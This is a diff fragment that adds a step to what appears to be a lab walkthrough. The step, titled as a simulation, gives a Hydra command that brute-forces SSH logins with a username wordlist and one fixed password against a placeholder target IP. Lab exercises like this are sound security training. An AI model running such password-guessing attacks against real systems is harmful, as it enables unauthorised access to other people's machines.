@@ -205,3 +205,11 @@ Created file:
 ```text
 wordlists/ssh-users.txt
 ```
+
+### Step 4.6 - Simulate Multi-Username SSH Targeting with Hydra
+
+Command used:
+```bash
+hydra -L wordlists/ssh-users.txt -p password -t 2 -V ssh://<TARGET-IP>
+```
+
